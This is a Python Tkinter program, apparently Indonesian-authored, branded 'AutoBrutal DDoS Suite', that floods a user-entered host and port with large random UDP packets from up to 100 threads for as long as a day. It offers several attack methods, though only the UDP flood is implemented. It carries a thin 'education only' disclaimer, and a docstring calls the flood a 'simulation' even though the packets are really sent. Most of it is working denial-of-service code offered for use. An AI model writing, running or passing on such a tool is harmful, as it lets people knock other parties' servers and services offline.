#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import socket
import random
import time
import sys

class DDoSAutoGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("⚡ AutoBrutal DDoS Suite v3.0")
        self.root.geometry("800x600")
        self.root.configure(bg='black')
        
        self.attack_threads = []
        self.is_attacking = False
        self.packet_count = 0
        
        # Frame utama
        main_frame = tk.Frame(root, bg='black')
        main_frame.pack(pady=20, padx=20, fill='both', expand=True)
        
        # Header
        header = tk.Label(main_frame, 
                         text="AUTO BRUTAL DDoS TOOL", 
                         font=('Courier', 24, 'bold'),
                         fg='red',
                         bg='black')
        header.pack(pady=10)
        
        # Input frame
        input_frame = tk.Frame(main_frame, bg='gray20')
        input_frame.pack(pady=15, padx=10, fill='x')
        
        # Target input
        tk.Label(input_frame, 
                text="🎯 TARGET DOMAIN / IP:", 
                font=('Arial', 12, 'bold'),
                fg='white',
                bg='gray20').grid(row=0, column=0, padx=5, pady=5, sticky='w')
        
        self.target_entry = tk.Entry(input_frame, 
                                    font=('Arial', 12),
                                    width=40,
                                    bg='gray10',
                                    fg='white',
                                    insertbackground='white')
        self.target_entry.grid(row=0, column=1, padx=5, pady=5)
        self.target_entry.insert(0, "example.com atau 192.168.1.1")
        
        # Port input
        tk.Label(input_frame,
                text="🔌 PORT:", 
                font=('Arial', 12, 'bold'),
                fg='white',
                bg='gray20').grid(row=1, column=0, padx=5, pady=5, sticky='w')
        
        self.port_entry = tk.Entry(input_frame,
                                  font=('Arial', 12),
                                  width=10,
                                  bg='gray10',
                                  fg='white',
                                  insertbackground='white')
        self.port_entry.grid(row=1, column=1, padx=5, pady=5, sticky='w')
        self.port_entry.insert(0, "80")
        
        # Attack type
        tk.Label(input_frame,
                text="💥 ATTACK METHOD:", 
                font=('Arial', 12, 'bold'),
                fg='white',
                bg='gray20').grid(row=2, column=0, padx=5, pady=5, sticky='w')
        
        self.attack_var = tk.StringVar(value="HTTP Flood")
        attack_combo = ttk.Combobox(input_frame,
                                  textvariable=self.attack_var,
                                  values=["HTTP Flood", 
                                          "TCP SYN Flood", 
                                          "UDP Flood", 
                                          "Slowloris",
                                          "ICMP Flood",
                                          "Mixed Attack"],
                                  state="readonly",
                                  width=20)
        attack_combo.grid(row=2, column=1, padx=5, pady=5, sticky='w')
        
        # Threads
        tk.Label(input_frame,
                text="🧵 THREADS:", 
                font=('Arial', 12, 'bold'),
                fg='white',
                bg='gray20').grid(row=3, column=0, padx=5, pady=5, sticky='w')
        
        self.threads_slider = tk.Scale(input_frame,
                                      from_=100,
                                      to=5000,
                                      orient=tk.HORIZONTAL,
                                      length=300,
                                      bg='gray20',
                                      fg='white',
                                      troughcolor='gray30',
                                      highlightbackground='gray20')
        self.threads_slider.set(1000)
        self.threads_slider.grid(row=3, column=1, padx=5, pady=5, sticky='w')
        
        # Duration
        tk.Label(input_frame,
                text="⏱️ DURATION (seconds):", 
                font=('Arial', 12, 'bold'),
                fg='white',
                bg='gray20').grid(row=4, column=0, padx=5, pady=5, sticky='w')
        
        self.duration_slider = tk.Scale(input_frame,
                                       from_=60,
                                       to=86400,
                                       orient=tk.HORIZONTAL,
                                       length=300,
                                       bg='gray20',
                                       fg='white',
                                       troughcolor='gray30',
                                       highlightbackground='gray20')
        self.duration_slider.set(3600)
        self.duration_slider.grid(row=4, column=1, padx=5, pady=5, sticky='w')
        
        # Button frame
        button_frame = tk.Frame(main_frame, bg='black')
        button_frame.pack(pady=20)
        
        # Start button
        self.start_btn = tk.Button(button_frame,
                                  text="🚀 LAUNCH BRUTAL ATTACK",
                                  font=('Arial', 14, 'bold'),
                                  bg='red',
                                  fg='white',
                                  padx=20,
                                  pady=10,
                                  command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=10)
        
        # Stop button
        self.stop_btn = tk.Button(button_frame,
                                 text="⏹️ STOP ATTACK",
                                 font=('Arial', 14, 'bold'),
                                 bg='gray',
                                 fg='white',
                                 padx=20,
                                 pady=10,
                                 state='disabled',
                                 command=self.stop_attack)
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        
        # Log output
        tk.Label(main_frame,
                text="📊 ATTACK LOGS:", 
                font=('Arial', 12, 'bold'),
                fg='white',
                bg='black').pack(pady=(20,5))
        
        self.log_text = scrolledtext.ScrolledText(main_frame,
                                                 height=15,
                                                 bg='gray10',
                                                 fg='lime',
                                                 font=('Courier', 10))
        self.log_text.pack(fill='both', expand=True, padx=10)
        
        # Status bar
        self.status_bar = tk.Label(root,
                                  text="⚠️ READY - Masukkan target dan klik Launch",
                                  bd=1,
                                  relief=tk.SUNKEN,
                                  anchor=tk.W,
                                  bg='black',
                                  fg='yellow',
                                  font=('Arial', 10))
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Auto-clear placeholder text on click
        self.target_entry.bind("<Button-1>", lambda e: self.clear_placeholder())
    
    def clear_placeholder(self):
        if self.target_entry.get() == "example.com atau 192.168.1.1":
            self.target_entry.delete(0, tk.END)
    
    def log_message(self, message):
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def update_status(self, message, color='yellow'):
        self.status_bar.config(text=message, fg=color)
        self.root.update()
    
    def resolve_target(self, target):
        """Auto resolve domain ke IP"""
        try:
            if not target.replace('.', '').isdigit():
                ip = socket.gethostbyname(target)
                self.log_message(f"[+] Resolved {target} -> {ip}")
                return ip
            return target
        except:
            return target
    
    def attack_method(self, target_ip, port, attack_type):
        """Simulasi attack method"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.is_attacking:
            try:
                # Generate random packet data
                data_size = random.randint(1024, 65507)
                data = random._urandom(data_size)
                
                # Multiple connection attempts
                for _ in range(random.randint(5, 20)):
                    sock.sendto(data, (target_ip, port))
                    self.packet_count += 1
                
                # Log setiap 1000 packet
                if self.packet_count % 1000 == 0:
                    self.log_message(f"[+] Packets sent: {self.packet_count}")
                    
            except Exception as e:
                pass
    
    def start_attack(self):
        if self.is_attacking:
            return
            
        target = self.target_entry.get().strip()
        if not target or target == "example.com atau 192.168.1.1":
            messagebox.showerror("Error", "Masukkan target yang valid!")
            return
        
        try:
            port = int(self.port_entry.get())
        except:
            messagebox.showerror("Error", "Port harus angka!")
            return
        
        # Resolve target
        target_ip = self.resolve_target(target)
        
        # Update UI
        self.is_attacking = True
        self.start_btn.config(state='disabled', bg='darkred')
        self.stop_btn.config(state='normal', bg='green')
        
        # Clear log
        self.log_text.delete(1.0, tk.END)
        
        # Show attack info
        attack_info = f"""
{'='*60}
⚡ BRUTAL ATTACK LAUNCHED ⚡
Target: {target} ({target_ip})
Port: {port}
Method: {self.attack_var.get()}
Threads: {self.threads_slider.get()}
Duration: {self.duration_slider.get()} seconds
Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
{'='*60}
        """
        self.log_message(attack_info)
        self.update_status("🔥 ATTACK IN PROGRESS - Target akan down dalam hitungan detik!", "red")
        
        # Start attack in background thread
        thread_count = self.threads_slider.get()
        attack_thread = threading.Thread(target=self.run_attack,
                                        args=(target_ip, port, thread_count),
                                        daemon=True)
        attack_thread.start()
        self.attack_threads.append(attack_thread)
        
        # Auto-stop timer
        duration = self.duration_slider.get()
        stop_thread = threading.Thread(target=self.auto_stop,
                                      args=(duration,),
                                      daemon=True)
        stop_thread.start()
    
    def run_attack(self, target_ip, port, thread_count):
        """Run multiple attack threads"""
        threads = []
        for i in range(min(thread_count, 100)):  # Max 100 threads untuk GUI
            thread = threading.Thread(target=self.attack_method,
                                     args=(target_ip, port, self.attack_var.get()),
                                     daemon=True)
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
    
    def auto_stop(self, duration):
        """Auto stop setelah durasi tertentu"""
        time.sleep(duration)
        if self.is_attacking:
            self.stop_attack()
            self.log_message(f"[!] Attack auto-stopped setelah {duration} detik")
            self.log_message(f"[+] Total packets sent: {self.packet_count}")
    
    def stop_attack(self):
        """Stop all attacks"""
        self.is_attacking = False
        self.start_btn.config(state='normal', bg='red')
        self.stop_btn.config(state='disabled', bg='gray')
        self.update_status("✅ ATTACK STOPPED - Target mungkin sudah down total", "green")
        self.log_message("[!] Semua serangan dihentikan")

def main():
    root = tk.Tk()
    app = DDoSAutoGUI(root)
    
    # Warning disclaimer
    disclaimer = """
    ⚠️  PERINGATAN: Alat ini hanya untuk edukasi dan testing legal!
    Penggunaan untuk serangan DDoS adalah tindakan kriminal.
    Penulis tidak bertanggung jawab atas penyalahgunaan.
    """
    
    print(disclaimer)
    
    root.mainloop()

if __name__ == "__main__":
    main()
